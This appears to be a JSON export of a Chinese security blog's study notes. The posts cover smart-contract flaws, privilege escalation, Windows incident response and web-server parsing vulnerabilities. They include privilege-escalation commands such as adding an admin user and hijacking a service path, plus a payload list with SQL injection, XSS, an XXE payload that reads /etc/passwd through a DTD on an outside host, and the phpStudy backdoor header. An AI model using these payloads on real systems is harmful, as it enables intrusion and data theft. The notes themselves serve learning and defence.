[{"title":"区块链之智能合约","url":"http://yoursite.com/2019/10/21/区块链之智能合约/","content":"<h1 id=\"区块链之智能合约\"><a href=\"#区块链之智能合约\" class=\"headerlink\" title=\"区块链之智能合约\"></a>区块链之智能合约</h1><h2 id=\"solidity代码特点\"><a href=\"#solidity代码特点\" class=\"headerlink\" title=\"solidity代码特点\"></a>solidity代码特点</h2><h2 id=\"漏洞风险\"><a href=\"#漏洞风险\" class=\"headerlink\" title=\"漏洞风险\"></a>漏洞风险</h2><h3 id=\"重入攻击\"><a href=\"#重入攻击\" class=\"headerlink\" title=\"重入攻击\"></a>重入攻击</h3><p>重入攻击是由于call.value()可以消耗所有的gas和回退函数之间的配合引起的，如果受害者合约使用call.value()来发送货币到攻击者合约，合约接收到ether时会使用回退函数，这时回退函数再调用攻击者合约的发送ether的模块，如果更新余额等操作发生在发送ether之前那么代码就将会在发送ether和回退函数之间迭代运行，这样合约账户的钱就会被全部转走。</p>\n<p><strong>预防</strong></p>\n<p>1.使用Call.value()先修改后转账，但失败不会自动回滚，需要手动处理。</p>\n<p>2.使用send ,transfer 转账时只有2300个gas，不足以支撑第二次交易，send一样失败不会回滚。</p>\n<h3 id=\"数值溢出检测\"><a href=\"#数值溢出检测\" class=\"headerlink\" title=\"数值溢出检测\"></a>数值溢出检测</h3><p>智能合约中的算数问题是指整数溢出和整数下溢。Solidity最多能处理256位的数字，超过会出现异常问题。</p>\n<p><strong>预防</strong></p>\n<p>1.使用SafeMath库</p>\n<h3 id=\"访问控制检测\"><a href=\"#访问控制检测\" class=\"headerlink\" title=\"访问控制检测\"></a>访问控制检测</h3><p>访问控制缺陷是所有程序中都可能存在的安全风险，智能合约也同样会存在类似问题，著名的Parity Wallet智能合约就受到过该问题的影响。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑</p>\n<h3 id=\"返回值调用验证\"><a href=\"#返回值调用验证\" class=\"headerlink\" title=\"返回值调用验证\"></a>返回值调用验证</h3><p>send和call.value失败返回为false，transfer失败抛出异常，如果不检测返回值继续执行代码可能出现问题。</p>\n<p><strong>预防</strong></p>\n<p>1.使用require抛出异常或者if处理失败send和call.value失败</p>\n<h3 id=\"错误使用随机数\"><a href=\"#错误使用随机数\" class=\"headerlink\" title=\"错误使用随机数\"></a>错误使用随机数</h3><p>区块链由于不存在真正的随机数，所以使用过去、现在、未来某个量作为随机数是可能存在问题的，区块链的随机数最好来自外部。</p>\n<p><strong>预防</strong></p>\n<p>1.使用不可预测的数字作为随机源</p>\n<h3 id=\"事务顺序依赖\"><a href=\"#事务顺序依赖\" class=\"headerlink\" title=\"事务顺序依赖\"></a>事务顺序依赖</h3><p>由于区块链的透明性，当一个用户做出一个请求如回答问题的到赏金，攻击者可以发送更高的gas以更早执行从而获取赏金等。</p>\n<p><strong>预防</strong></p>\n<p>1.通过代码逻辑防止该类攻击，比如说先提交MD5码，等处理完后再提交答案，以MD5码的时间为准等。</p>\n<h3 id=\"拒绝服务攻击\"><a href=\"#拒绝服务攻击\" class=\"headerlink\" title=\"拒绝服务攻击\"></a>拒绝服务攻击</h3><p>通过攻击手段导致程序不能执行。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑</p>\n<h3 id=\"逻辑设计缺陷\"><a href=\"#逻辑设计缺陷\" class=\"headerlink\" title=\"逻辑设计缺陷\"></a>逻辑设计缺陷</h3><p>合约设计逻辑存在漏洞</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑</p>\n<h3 id=\"假充值漏洞\"><a href=\"#假充值漏洞\" class=\"headerlink\" title=\"假充值漏洞\"></a>假充值漏洞</h3><p>如充值处程序设计错误，仅判断是否余额足够但却继续执行了充值代码。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑，使用require来处理程序。</p>\n<h3 id=\"增发代币漏洞\"><a href=\"#增发代币漏洞\" class=\"headerlink\" title=\"增发代币漏洞\"></a>增发代币漏洞</h3><p>检测在初始化代币总量后，代币合约中存在可能使代币总量增加的函数。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测是否存在非正常的可增加代币。</p>\n","categories":[],"tags":[]},{"title":"提权","url":"http://yoursite.com/2019/10/15/提权/","content":"<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>查看主机名</p>\n<p>hostname</p>\n<p>查看用户名</p>\n<p>whoami</p>\n<p>查看用户名对应属组</p>\n<p>window:net user 用户名</p>\n<p>linux:groups 用户名</p>\n<p>添加用户</p>\n<p>window:net user username password /add</p>\n<p>linux:useradd -m -s  用户名 passwd 用户名</p>\n<p>将用户加入管理组</p>\n<p>window:net localgroup administrators username /add</p>\n<p>linux:usermod -a -G 用户组 用户名</p>\n<p>系统信息</p>\n<p>window: systeminfo(详细补丁信息wmic qfe list)</p>\n<p>linxu: uname -a查看内核版本</p>\n<p>查看域中计算机列表</p>\n<p>net view</p>\n<p><strong><a href=\"https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484666&idx=1&sn=4ce455c0144c7b1474625f541a868876&chksm=ec1e34d2db69bdc49bb4cd22b47e1f1dbb02e95dfaab7d0aa63f8e44838f00fd53af0b215cb9&scene=21#wechat_redirect\" target=\"_blank\" rel=\"noopener\">window下主机信息收集命令</a></strong></p>\n<h2 id=\"提权分类\"><a href=\"#提权分类\" class=\"headerlink\" title=\"提权分类\"></a>提权分类</h2><h3 id=\"window\"><a href=\"#window\" class=\"headerlink\" title=\"window\"></a>window</h3><h3 id=\"不带引号的服务路径\"><a href=\"#不带引号的服务路径\" class=\"headerlink\" title=\"不带引号的服务路径\"></a>不带引号的服务路径</h3><p>使用c:\\a n\\1.exe来执行程序时是执行的c:\\a。</p>\n<p><img src=\"/2019/10/15/提权/1571234782646.png\" alt=\"1571234782646\"></p>\n<p>也就是说我们只要对这种目录具有w权限便能上传恶意exe让系统服务来执行提权,这是一种劫持型的攻击。</p>\n<p>检测命令:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"错误的服务权限\"><a href=\"#错误的服务权限\" class=\"headerlink\" title=\"错误的服务权限\"></a>错误的服务权限</h3><p>由于用户可能对某些服务拥有过高权限导致的提权，如升级程序等，用户对升级程序存在写权限就可以替换该程序提权。和服务路径提权一样，也是一种劫持型攻击。可以使用微软官方程序accesschk.exe检查</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">accesschk.exe -uwcqv &quot;用户名 * /accepteula//列出可被用户名修改的服务</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"注册表权限错误\"><a href=\"#注册表权限错误\" class=\"headerlink\" title=\"注册表权限错误\"></a>注册表权限错误</h3><p>通过修改注册表改变服务执行路径导致系统以system执行我们上传的exe文件，下载<a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=23510\" target=\"_blank\" rel=\"noopener\">subinacl工具</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找易受攻击服务列表</span><br><span class=\"line\">subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Service&quot; /display</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行攻击代码</span><br><span class=\"line\">reg add &quot;服务注册表路径&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;攻击程序&quot; /f</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"不安全的文件系统权限\"><a href=\"#不安全的文件系统权限\" class=\"headerlink\" title=\"不安全的文件系统权限\"></a>不安全的文件系统权限</h3><p>管理员可能配置某个服务的目录为所有人完全控制之类的，通过替换exe文件来提权。</p>\n<h3 id=\"AlwaysInstallElevated\"><a href=\"#AlwaysInstallElevated\" class=\"headerlink\" title=\"AlwaysInstallElevated\"></a>AlwaysInstallElevated</h3><p>AlwaysInstallElevated是一个策略设置，允许任意用户以system权限运行MSI文件，可导致提权。默认关闭。</p>\n<h3 id=\"密钥凭证窃取\"><a href=\"#密钥凭证窃取\" class=\"headerlink\" title=\"密钥凭证窃取\"></a>密钥凭证窃取</h3><p>当服务器的安全配置做的很好的时候就尝试在服务器中翻找password等关键字段。</p>\n<h3 id=\"文件系统权限配置不当提权\"><a href=\"#文件系统权限配置不当提权\" class=\"headerlink\" title=\"文件系统权限配置不当提权\"></a>文件系统权限配置不当提权</h3><p>suid和sgid是当执行文件时使用文件属主和属组的权限，目录的S属性使得在该目录下创建的任何文件及目录属于该目录所拥有的组。错误的配置文件目录可以通过这样的配置来提高权限</p>\n<h2 id=\"系统漏洞提权\"><a href=\"#系统漏洞提权\" class=\"headerlink\" title=\"系统漏洞提权\"></a>系统漏洞提权</h2><p>系统漏洞检测脚本：<a href=\"https://github.com/mzet-/linux-exploit-suggester\" target=\"_blank\" rel=\"noopener\">linux</a>和<a href=\"https://github.com/AonCyberLabs/Windows-Exploit-Suggester\" target=\"_blank\" rel=\"noopener\">window</a>通过工具、人工寻找可能存在的漏洞使用exp提权</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://blog.csdn.net/Fly_hps/article/details/80301264\" target=\"_blank\" rel=\"noopener\">window提权教程</a></p>\n","categories":[],"tags":[]},{"title":"poc整理","url":"http://yoursite.com/2019/10/14/poc整理/","content":"<h1 id=\"POC整理\"><a href=\"#POC整理\" class=\"headerlink\" title=\"POC整理\"></a>POC整理</h1><p>这里整理一些poc方便平时查询与使用</p>\n<h2 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常用字段:</span><br><span class=\"line\">database()               //获取当前数据库</span><br><span class=\"line\">version()                //获取数据库版本</span><br><span class=\"line\">user()                   //获取用户</span><br><span class=\"line\">@@datadir                //获取数据库路径</span><br><span class=\"line\">@@version_compile_os     //获取操作系统</span><br><span class=\"line\">@@basedir                //mysql安装路径</span><br><span class=\"line\">session_user()           //获取连接数据库的用户名</span><br><span class=\"line\">current_user()           //获取当前用户名</span><br><span class=\"line\">system_user()            //获取系统用户名</span><br><span class=\"line\">盲注:</span><br><span class=\"line\">bool:</span><br><span class=\"line\">and ((select ascii(substr(database(),&quot;从第m个字符开始截取&quot;,&quot;截取长度&quot;)))&gt;&quot;ascii值&quot;)</span><br><span class=\"line\">时间盲注:</span><br><span class=\"line\">if(ascii(substr((user()),1,1))=115,true,false)</span><br><span class=\"line\">报错注入:</span><br><span class=\"line\">and(updatexml(1,concat(0x7e,(select database())),0));</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"xxe\"><a href=\"#xxe\" class=\"headerlink\" title=\"xxe\"></a>xxe</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE foo [</span><br><span class=\"line\">&lt;!ELEMENT foo ANY &gt;</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://120.79.91.29/evil.dtd&quot;&gt;</span><br><span class=\"line\">%remote;%all;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;foo&gt;</span><br><span class=\"line\">    &lt;code&gt;&amp;send;&lt;/code&gt;</span><br><span class=\"line\">    &lt;msg&gt;mypass&lt;/msg&gt;</span><br><span class=\"line\">&lt;/foo&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Clickjacking\"><a href=\"#Clickjacking\" class=\"headerlink\" title=\"Clickjacking\"></a>Clickjacking</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;Clickjacking&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;iframe src=&quot;http://***&quot; width=&quot;1200&quot; height=&quot;600&quot; /&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Phpstudy后门\"><a href=\"#Phpstudy后门\" class=\"headerlink\" title=\"Phpstudy后门\"></a>Phpstudy后门</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept-Encoding:gzip,deflate</span><br><span class=\"line\">Accept-Charset:c3lzdGVtKCd3aG9hbWknKTs=(whoami)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"JSONP\"><a href=\"#JSONP\" class=\"headerlink\" title=\"JSONP\"></a>JSONP</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">function useUserInfo(v)&#123;</span><br><span class=\"line\">  alert(v.username);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;script src=&quot;http://www.test.com/userinfo?callback=&quot;返回名&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]},{"title":"windows应急","url":"http://yoursite.com/2019/09/29/windows应急/","content":"<h1 id=\"window应急响应\"><a href=\"#window应急响应\" class=\"headerlink\" title=\"window应急响应\"></a>window应急响应</h1><p>应急响应是安全的一个非常重要的点，应急响应是为了在事故发生之后降低损失，排查攻击路径以方便修复以防被再次攻击，甚至追踪到攻击者追责。</p>\n<h2 id=\"基础排查\"><a href=\"#基础排查\" class=\"headerlink\" title=\"基础排查\"></a>基础排查</h2><h3 id=\"账号排查\"><a href=\"#账号排查\" class=\"headerlink\" title=\"账号排查\"></a>账号排查</h3><p>命令输入lusrmgr.msc打开账户组情况</p>\n<p>HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\注册表系统账号排查</p>\n<h3 id=\"异常端口\"><a href=\"#异常端口\" class=\"headerlink\" title=\"异常端口\"></a>异常端口</h3><p>netstat -ano排查端口查看端口是否有连接一些异常的IP</p>\n<p>tasklist  | findstr “PID”查看开启连接的文件</p>\n<h3 id=\"进程检查\"><a href=\"#进程检查\" class=\"headerlink\" title=\"进程检查\"></a>进程检查</h3><p>命令行打开msinfo32，检查意外中的进程。</p>\n<h3 id=\"检查启动项\"><a href=\"#检查启动项\" class=\"headerlink\" title=\"检查启动项\"></a>检查启动项</h3><h3 id=\"检查计划任务\"><a href=\"#检查计划任务\" class=\"headerlink\" title=\"检查计划任务\"></a>检查计划任务</h3><h3 id=\"检查服务器自启动\"><a href=\"#检查服务器自启动\" class=\"headerlink\" title=\"检查服务器自启动\"></a>检查服务器自启动</h3><h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>eventvwr.msc打开日志功能</p>\n<p>常见事件ID与对应事件</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">事件ID</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">1102</td>\n<td align=\"left\">清理审计日志</td>\n</tr>\n<tr>\n<td align=\"left\">4624</td>\n<td align=\"left\">账号成功登录</td>\n</tr>\n<tr>\n<td align=\"left\">4625</td>\n<td align=\"left\">账号登录失败</td>\n</tr>\n<tr>\n<td align=\"left\">4768</td>\n<td align=\"left\">Kerberos身份验证（TGT请求）</td>\n</tr>\n<tr>\n<td align=\"left\">4769</td>\n<td align=\"left\">Kerberos服务票证请求</td>\n</tr>\n<tr>\n<td align=\"left\">4776</td>\n<td align=\"left\">NTLM身份验证</td>\n</tr>\n<tr>\n<td align=\"left\">4672</td>\n<td align=\"left\">授予特殊权限</td>\n</tr>\n<tr>\n<td align=\"left\">4720</td>\n<td align=\"left\">创建用户</td>\n</tr>\n<tr>\n<td align=\"left\">4726</td>\n<td align=\"left\">删除用户</td>\n</tr>\n<tr>\n<td align=\"left\">4728</td>\n<td align=\"left\">将成员添加到启用安全的全局组中</td>\n</tr>\n<tr>\n<td align=\"left\">4729</td>\n<td align=\"left\">将成员从安全的全局组中移除</td>\n</tr>\n<tr>\n<td align=\"left\">4732</td>\n<td align=\"left\">将成员添加到启用安全的本地组中</td>\n</tr>\n<tr>\n<td align=\"left\">4733</td>\n<td align=\"left\">将成员从启用安全的本地组中移除</td>\n</tr>\n<tr>\n<td align=\"left\">4756</td>\n<td align=\"left\">将成员添加到启用安全的通用组中</td>\n</tr>\n<tr>\n<td align=\"left\">4757</td>\n<td align=\"left\">将成员从启用安全的通用组中移除</td>\n</tr>\n<tr>\n<td align=\"left\">4719</td>\n<td align=\"left\">系统审计策略修改</td>\n</tr>\n</tbody></table>\n","categories":[],"tags":[]},{"title":"web容器漏洞","url":"http://yoursite.com/2019/09/23/web容器漏洞/","content":"<h1 id=\"常见容器的区别与介绍\"><a href=\"#常见容器的区别与介绍\" class=\"headerlink\" title=\"常见容器的区别与介绍\"></a>常见容器的区别与介绍</h1><p>我们经常听说<strong>web服务器</strong>，<strong>http服务器</strong>，<strong>应用服务器</strong>。<strong>Web服务器</strong>是指在Internet上的计算机程序，因为Web服务器主要支持的协议就是HTTP协议，通常情况下我们说的WEB服务器和HTTP服务器说的是同一回事，<strong>应用服务器</strong>是用于处理一些动态数据，处理脚本文件的。<strong>Apache</strong>和<strong>Nginx</strong>是纯粹的<strong>Web服务器</strong>，而<strong>IIS</strong>和<strong>Tomcat</strong>因为具有了解释和执行服务器端代码的能力，可以称作为<strong>轻量级应用服务器</strong>。</p>\n<p>这篇文章会整理一些常见安全问题而非所有。</p>\n<h2 id=\"Apache服务器\"><a href=\"#Apache服务器\" class=\"headerlink\" title=\"Apache服务器\"></a>Apache服务器</h2><h3 id=\"解析漏洞\"><a href=\"#解析漏洞\" class=\"headerlink\" title=\"解析漏洞\"></a>解析漏洞</h3><p>解析漏洞老生长谈了，无非是Apache遇到无法识别的1.php.aa的后缀会向前解析。</p>\n<p>看了一篇文章<a href=\"http://www.cnblogs.com/milantgh/p/5116955.html他这里描述了，使用module模式与php结合的所有版本\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/milantgh/p/5116955.html他这里描述了，使用module模式与php结合的所有版本</a> apache存在未知扩展名解析漏洞，使用fastcgi模式与php结合的所有版本apache不存在此漏洞。</p>\n<p>module、cgi、fastcgi的区别可以参考<a href=\"https://blog.csdn.net/lamp_yang_3533/article/details/53002731\" target=\"_blank\" rel=\"noopener\">文章</a>。</p>\n<h3 id=\"换行解析漏洞\"><a href=\"#换行解析漏洞\" class=\"headerlink\" title=\"换行解析漏洞\"></a>换行解析漏洞</h3><p><strong>影响版本：</strong>Apache2.4.0~2.4.29</p>\n<p>参考cve-2017-15715</p>\n<p>在Apache2.4.0~2.4.29上传1.php%0a会存在解析漏洞。</p>\n<p><img src=\"/2019/09/23/web容器漏洞/1569228467146.png\" alt=\"1569228467146\"></p>\n<p>获取文件名时不能用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，因为他会自动把换行去掉。</p>\n<p>php后缀php、php3、php4、php5、phpt、phtml，phtml是ZendFramework模板的，正常情况不会解析。</p>\n<h3 id=\"htaccess文件上传\"><a href=\"#htaccess文件上传\" class=\"headerlink\" title=\".htaccess文件上传\"></a>.htaccess文件上传</h3><p><strong>影响版本：</strong>所有</p>\n<p>自己实验一直没成功，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后配置了shell.php都不能解析。</p>\n<h2 id=\"Nginx服务器\"><a href=\"#Nginx服务器\" class=\"headerlink\" title=\"Nginx服务器\"></a>Nginx服务器</h2><h3 id=\"用户配置错误解析漏洞\"><a href=\"#用户配置错误解析漏洞\" class=\"headerlink\" title=\"用户配置错误解析漏洞\"></a>用户配置错误解析漏洞</h3><p><strong>影响版本：</strong>所有</p>\n<p>这是php的配置问题cgi.fix_pathinfo默认为1导致存在解析漏洞，nginx看到1.jpg/.php结尾就发给就发给了php，php没有找到该文件就会进行补全删掉该后缀解析了1.jpg中的内容。这漏洞存在于所有版本。</p>\n<h3 id=\"解析漏洞-CVE-2013-4547\"><a href=\"#解析漏洞-CVE-2013-4547\" class=\"headerlink\" title=\"解析漏洞(CVE-2013-4547)\"></a>解析漏洞(CVE-2013-4547)</h3><p><strong>影响版本：</strong>Nginx 0.8.41<del>1.4.3 / 1.5.0</del>1.5.7</p>\n<p><a href=\"https://www.cnblogs.com/bmjoker/p/9838600.html\" target=\"_blank\" rel=\"noopener\">文章</a>可以参考，1.gif[0x20]的文件，然后访问1.gif[0x20][0x00].php的文件gif会被当做php解析</p>\n<h3 id=\"空字节解析漏洞\"><a href=\"#空字节解析漏洞\" class=\"headerlink\" title=\"空字节解析漏洞\"></a>空字节解析漏洞</h3><p><strong>版本:</strong>0.5.<em>,0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>\n<p>Nginx在图片中嵌入PHP代码然后通过访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"nginx越界读取缓存漏洞CVE-2017-7529\"><a href=\"#nginx越界读取缓存漏洞CVE-2017-7529\" class=\"headerlink\" title=\"nginx越界读取缓存漏洞CVE-2017-7529\"></a>nginx越界读取缓存漏洞CVE-2017-7529</h3><p><strong>影响版本：</strong>Nginx version 0.5.6 - 1.13.2</p>\n<p><a href=\"https://github.com/vulhub/vulhub/blob/master/nginx/CVE-2017-7529/poc.py\" target=\"_blank\" rel=\"noopener\">poc</a>这个漏洞就是整数溢出漏洞的利用，能够从Cache文件中获取Cache头的信息。在某些配置的情况下Cache头中会存在IP地址信息，造成信息泄露绕过waf等。</p>\n<h3 id=\"目录穿越漏洞\"><a href=\"#目录穿越漏洞\" class=\"headerlink\" title=\"目录穿越漏洞\"></a>目录穿越漏洞</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /files &#123;</span><br><span class=\"line\">    alias /home/;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样的配置形式会导致任意文件读取，<a href=\"https://ip/files../../etc/password，修复files后加上/。\" target=\"_blank\" rel=\"noopener\">https://ip/files../../etc/password，修复files后加上/。</a></p>\n<h3 id=\"CRLF注入\"><a href=\"#CRLF注入\" class=\"headerlink\" title=\"CRLF注入\"></a>CRLF注入</h3><p>当url/test%0a%0dSet-Cookie：hello被设置在http返回包时CRLF将会换行设置cookie，这样可以用来钓鱼之类的攻击</p>\n<h2 id=\"IIS\"><a href=\"#IIS\" class=\"headerlink\" title=\"IIS\"></a>IIS</h2><h3 id=\"文件名解析漏洞\"><a href=\"#文件名解析漏洞\" class=\"headerlink\" title=\"文件名解析漏洞\"></a>文件名解析漏洞</h3><p><strong>版本:</strong>IIS6.0/5.*</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">目录解析:/xx.asp/xx.jpg</span><br><span class=\"line\">文件解析:sp.asp;.jpg</span><br></pre></td></tr></table></figure>\n\n<p>在IIS6.0下，分号后面的不被解析，也就是说1.asp;.jpg=1.asp</p>\n<h3 id=\"IIS-7-0-IIS-7-5用户配置错误解析漏洞\"><a href=\"#IIS-7-0-IIS-7-5用户配置错误解析漏洞\" class=\"headerlink\" title=\"IIS 7.0/IIS 7.5用户配置错误解析漏洞\"></a>IIS 7.0/IIS 7.5用户配置错误解析漏洞</h3><p>同nginx一样</p>\n<h3 id=\"PUT方法上传\"><a href=\"#PUT方法上传\" class=\"headerlink\" title=\"PUT方法上传\"></a>PUT方法上传</h3><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p>\n<h3 id=\"短文件名漏洞\"><a href=\"#短文件名漏洞\" class=\"headerlink\" title=\"短文件名漏洞\"></a>短文件名漏洞</h3><p><strong>版本:</strong></p>\n<blockquote>\n<p>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customerrors>或没有web.config）</customerrors></p>\n<p>IIS 8.0、IIS 8.5和IIS 10.0的短文件名称均可以通过OPTIONS和TRACE方法被猜测成功。</p>\n<p>IIS 7.5，Windows 2008（经典管道模式）        </p>\n<p>注意：IIS使用.Net Framework 4时不受影响</p>\n</blockquote>\n<p><u><a href=\"http://ip/a*~1****/a.aspx\" target=\"_blank\" rel=\"noopener\">http://ip/a*~1****/a.aspx</a></u>文件名首字母为a的文件存在返回400</p>\n<p><u><a href=\"http://ip/ab*~1****/a.aspx\" target=\"_blank\" rel=\"noopener\">http://ip/ab*~1****/a.aspx</a></u>文件名首字母为ab的文件存在返回400</p>\n<p>依次猜解获得短文件名。<a href=\"http://www.lijiejie.com/iis-win8-3-shortname-brute/\" target=\"_blank\" rel=\"noopener\">教程</a></p>\n<h2 id=\"tomcat\"><a href=\"#tomcat\" class=\"headerlink\" title=\"tomcat\"></a>tomcat</h2><h3 id=\"tomcat弱口令远程部署后门文件\"><a href=\"#tomcat弱口令远程部署后门文件\" class=\"headerlink\" title=\"tomcat弱口令远程部署后门文件\"></a>tomcat弱口令远程部署后门文件</h3><p><a href=\"http://ip/manager/html是tomcat部署的地址，对于一些网站可能存在弱口令，攻击者通过远程部署上传后门\" target=\"_blank\" rel=\"noopener\">http://ip/manager/html是tomcat部署的地址，对于一些网站可能存在弱口令，攻击者通过远程部署上传后门</a></p>\n<h2 id=\"JBOSS\"><a href=\"#JBOSS\" class=\"headerlink\" title=\"JBOSS\"></a>JBOSS</h2><h3 id=\"JBOSS远程部署获取服务器权限\"><a href=\"#JBOSS远程部署获取服务器权限\" class=\"headerlink\" title=\"JBOSS远程部署获取服务器权限\"></a>JBOSS远程部署获取服务器权限</h3><p><a href=\"http://localhost:8080/jmx-console/\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/jmx-console/</a>, jboss和tomcat都可以远程部署，如果存在弱口令可以获取webshell</p>\n<p><a href=\"https://blog.csdn.net/weixin_42936566/article/details/86841666\" target=\"_blank\" rel=\"noopener\">参考资料</a></p>\n<h2 id=\"WebLogic\"><a href=\"#WebLogic\" class=\"headerlink\" title=\"WebLogic\"></a>WebLogic</h2><h3 id=\"WebLogic远程部署\"><a 